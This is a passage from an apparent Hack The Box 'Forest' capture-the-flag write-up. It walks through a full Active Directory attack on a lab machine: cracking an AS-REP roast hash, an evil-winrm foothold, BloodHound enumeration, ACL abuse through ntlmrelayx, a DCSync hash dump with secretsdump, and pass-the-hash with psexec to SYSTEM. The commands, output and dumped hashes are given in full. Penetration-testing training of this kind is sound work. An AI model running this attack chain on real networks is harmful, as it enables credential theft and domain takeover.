Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB:b7289cb008c7f4599eab770bf00d706f$8e6bb582361a38e0fa62658c26eec7910ea6ffc37b41924cd8eda8e4d74ccade54b6061b40807a5174ccab90f96a517def03168a37a0f7a623a50d790d281b07205c2ad062b21f1db353483f57dd57fc9c2c467ea80940822bb832ec9943898f06b21822d3881eea5a4f474bdb52a0e942274e2323986df69d887fbad9ed47d7c48438b49de1acabde782f3b09e6944cd470ea221b31e5e4d5d804bcd9ef56b84a88f2f5a91f5674523e331d0b037ae883d7a397c6c0abd39871be6e68dbebb7c6908b91ebece7705ad97dc651a0a95cfb6fdf9a8065b69b4c20d9796bcdfbbf:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB:b7289cb008c7f4599eab...cdfbbf
Time.Started.....: Wed May 17 13:58:34 2023 (3 secs)
Time.Estimated...: Wed May 17 13:58:37 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1455.7 kH/s (2.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4087808/14344385 (28.50%)
Rejected.........: 0/4087808 (0.00%)
Restore.Point....: 4083712/14344385 (28.47%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: s523480 -> s2704081
Hardware.Mon.#1..: Util: 74%

Started: Wed May 17 13:58:33 2023
Stopped: Wed May 17 13:58:38 2023

```
In no time we discovered the password `s3rvice` for `svc-alfreco`. Let's try to logon with evil-winrm with those fresh found credentials. Evil-winrm can be used when port TCP 5985 is open as discovered earlier with the nmap port scan.

## Initial access
Let's use evil-winrm to start an interactive shell as `svc-alfreco`.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ evil-winrm -i $ip -u svc-alfresco -p 's3rvice'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

```
It looks like we got our foothold on this machine. Now it is time to enumerate locally on the system.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> hostname
FOREST
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::172
   IPv6 Address. . . . . . . . . . . : dead:beef::6146:3b90:48dc:ee17
   Link-local IPv6 Address . . . . . : fe80::6146:3b90:48dc:ee17%5
   IPv4 Address. . . . . . . . . . . : 10.129.185.152
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:7437%5
                                       10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

```
Before we continue with escalating our priviliges, we should collect our user flag.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls ../desktop


    Directory: C:\Users\svc-alfresco\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/17/2023   4:31 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type ../desktop/user.txt
<FLAG FLAG FLAG>>

```

Let's upload some tools to gather information from the domain (SharpHound) and from the whole system (with WinPEAS). 
Evil-winrm has the ability to upload and download files.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /home/emvee/Documents/HTB/Forest/SharpHound.exe 
Info: Uploading /home/emvee/Documents/HTB/Forest/SharpHound.exe to C:\Users\svc-alfresco\Documents\SharpHound.exe

                                                             
Data: 1402196 bytes of 1402196 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /home/emvee/Documents/HTB/Forest/winPEASany.exe
Info: Uploading /home/emvee/Documents/HTB/Forest/winPEASany.exe to C:\Users\svc-alfresco\Documents\winPEASany.exe

                                                             
Data: 2626216 bytes of 2626216 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/17/2023   5:12 AM        1051648 SharpHound.exe
-a----        5/17/2023   5:12 AM        1969664 winPEASany.exe


```

Since the files are on the system we can run them. Let's first collect some information about the domain. 

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\SharpHound.exe
2023-05-17T05:18:17.9283129-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-05-17T05:18:18.0689337-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-05-17T05:18:18.0845578-07:00|INFORMATION|Initializing SharpHound at 5:18 AM on 5/17/2023
2023-05-17T05:18:18.4652803-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-05-17T05:18:19.3900586-07:00|INFORMATION|Beginning LDAP search for htb.local
2023-05-17T05:18:19.7031128-07:00|INFORMATION|Producer has finished, closing LDAP channel
2023-05-17T05:18:19.7031128-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-05-17T05:18:50.1472520-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 43 MB RAM
2023-05-17T05:19:05.8741919-07:00|INFORMATION|Consumers finished, closing output channel
2023-05-17T05:19:05.9210647-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-05-17T05:19:06.1085654-07:00|INFORMATION|Status: 161 objects finished (+161 3.5)/s -- Using 50 MB RAM
2023-05-17T05:19:06.1085654-07:00|INFORMATION|Enumeration finished in 00:00:46.7239454
2023-05-17T05:19:06.2179410-07:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 117 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-05-17T05:19:06.2335674-07:00|INFORMATION|SharpHound Enumeration Completed at 5:19 AM on 5/17/2023! Happy Graphing!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/17/2023   5:19 AM          18926 20230517051905_BloodHound.zip
-a----        5/17/2023   5:19 AM          19538 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        5/17/2023   5:12 AM        1051648 SharpHound.exe
-a----        5/17/2023   5:12 AM        1969664 winPEASany.exe


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

```
All gathered data is stored in a ZIP archive. So, let's download the archive to my machine with evil-winrm.

```powershell

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20230517051905_BloodHound.zip
Info: Downloading 20230517051905_BloodHound.zip to ./20230517051905_BloodHound.zip

                                                             
Info: Download successful!

```
After downloading it to my kali machine I imported the archive into BloodHound.
As first I would like to see the Domain Admins.

![Image](/assets/img/WriteUp/HTB/Forest//Pasted image 20230517142122.png){: width="700" height="400" }

There is only one domain administrator. Before moving on we should indicate that we have 'pwned' the `svc-alfresco` account in Bloodhound. It will be shown by a skull icon.

![Image](/assets/img/WriteUp/HTB/Forest//Pasted image 20230517142314.png){: width="700" height="400" }

Click on `Shortest Paths to Unconstrained Delegation Systems` to see if this is the path to escalate our privileges.

![Image](/assets/img/WriteUp/HTB/Forest//Pasted image 20230517142459.png){: width="700" height="400" }

For the initial foothold we have attacked AS-REP roastable users. We can check in Bloodhound what users are vulnerable for AS-REP roasting.

![Image](/assets/img/WriteUp/HTB/Forest//Pasted image 20230517142641.png){: width="700" height="400" }

To see the shortest attack path to own the domain we can try the shortest path `Shortest Path from Owned Principals` since we have indicated what account we have pwned.

![Image](/assets/img/WriteUp/HTB/Forest//Pasted image 20230517142825.png){: width="700" height="400" }

Based on this information we can see some misconfigurations in the Access Control List (ACL) since we have `GenericAll` on `EXCH01.HTB.LOCAL`.

We can double check this by clicking on `Shortest Paths to Domain Admins from Owned Principals` in Bloodhound.

![Image](/assets/img/WriteUp/HTB/Forest//Pasted image 20230517145020.png){: width="700" height="400" }

Again we can see we can abuse `GenericAll` to gain Domain privileges. Bloodhound has a great function to indicate how we can abuse a certain technique by right clicking wit the mouse on the permissions `GenericAll`.

![Image](/assets/img/WriteUp/HTB/Forest//Pasted image 20230517145143.png){: width="700" height="400" }

Next interesting realtion has the value `WriteDacl`. We could check in Bloodhound some info what this means.

![Image](/assets/img/WriteUp/HTB/Forest//Pasted image 20230517150133.png){: width="700" height="400" }

And even how to abuse this is described in Bloodhound.

![Image](/assets/img/WriteUp/HTB/Forest//Pasted image 20230517150228.png){: width="700" height="400" }

Since we have enough information on how we should gain more privileges let's check our group membership.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

```
Let's check who is member of the `Exchange Windows Permissions` domain group .
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /domain
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
The command completed successfully.
```


## Privilege escalation
We should add our user `svc-alfresco` to the group `Exchange Windows Permissions` and double check if it was succeeded.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" svc-alfresco /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /domain
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
svc-alfresco
The command completed successfully.

```
Now we should setup the `ntlmrelay.py` from Impacket to relay to LDAP, and escalate the user `svc-alfresco` to give the Replication privileges.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ sudo ntlmrelayx.py -t ldap://$ip --escalate-user svc-alfresco 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
```

Next we should visit any page on the server and enter the credentials.

![Image](/assets/img/WriteUp/HTB/Forest//Pasted image 20230517154534.png){: width="700" height="400" }

After we have cliecked the `Sign in` button we should check the output from `ntlmrelayx.py`.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ sudo ntlmrelayx.py -t ldap://$ip --escalate-user svc-alfresco 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
[*] HTTPD: Received connection from 10.10.14.22, attacking target ldap://10.129.185.152
[*] HTTPD: Client requested path: /
[*] HTTPD: Received connection from 10.10.14.22, attacking target ldap://10.129.185.152
[*] HTTPD: Client requested path: /
[*] HTTPD: Client requested path: /
[*] Authenticating against ldap://10.129.185.152 as \svc-alfresco SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from 10.10.14.22, attacking target ldap://10.129.185.152
[*] HTTPD: Client requested path: /favicon.ico
[*] HTTPD: Client requested path: /favicon.ico
[*] HTTPD: Client requested path: /favicon.ico
[*] Authenticating against ldap://10.129.185.152 as \svc-alfresco SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] User privileges found: Create user
[*] User privileges found: Modifying domain ACL
[*] Querying domain security descriptor
[*] Success! User svc-alfresco now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20230517-154158.restore
[*] User privileges found: Create user
[*] User privileges found: Modifying domain ACL
[-] ACL attack already performed. Refusing to continue

```
Since we have replication permissions on the domain we can dump all the hashes with a DCSYNC attack via `secretsdump.py` from impacket.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ secretsdump.py htb.local/svc-alfresco@$ip -just-dc
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:d5ae2dbb122bae7e50910b77a54d8fa5:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
FOREST$:aes256-cts-hmac-sha1-96:35e5ff563c995246719a10a821adc6ebb6a45d126a730fef4133c0bca0648bae
FOREST$:aes128-cts-hmac-sha1-96:f31818090f2d5baee9457ba27a04201d
FOREST$:des-cbc-md5:cee9dc524a157a3b
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
```

Since we got the hash of the domain administrator we can use it by passing it with `psexec.py` to the DC. 
As soon we got access to the system we will be `nt authority\system` and we have completly owned the whole domain on Forest.
`.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ psexec.py -hashes ":32693b11e6aa90eb43d32c72a07ceea6" administrator@$ip
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.129.185.152.....
[*] Found writable share ADMIN$
[*] Uploading file vvSfZKCo.exe
[*] Opening SVCManager on 10.129.185.152.....
[*] Creating service tIlA on 10.129.185.152.....
[*] Starting service tIlA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
FOREST

C:\Windows\system32>ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::172
   IPv6 Address. . . . . . . . . . . : dead:beef::6146:3b90:48dc:ee17
   Link-local IPv6 Address . . . . . : fe80::6146:3b90:48dc:ee17%5
   IPv4 Address. . . . . . . . . . . : 10.129.185.152
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:7437%5
                                       10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb

C:\Windows\system32>type c:\users\administrator\desktop\root.txt
<FLAG FLAG FLAG>

C:\Windows\system32>

```

In conclusion, Forest is an awesome vulnerable machine for anyone looking to enhance their penetration testing skills, particularly in the context of Active Directory security. By exploring vulnerabilities such as Kerberos exploitation, ASREPRoasting, misconfigutations in permissions and DCSync attacks, you will gain hands-on experience that is crucial for both OSCP and OSEP preparation. The practical challenges presented in Forest not only deepen understanding of common security pitfalls but also they will equip you with the knowledge how to use them and perhaps with some resource you will learn how to defend against real-world threats like those in Forest.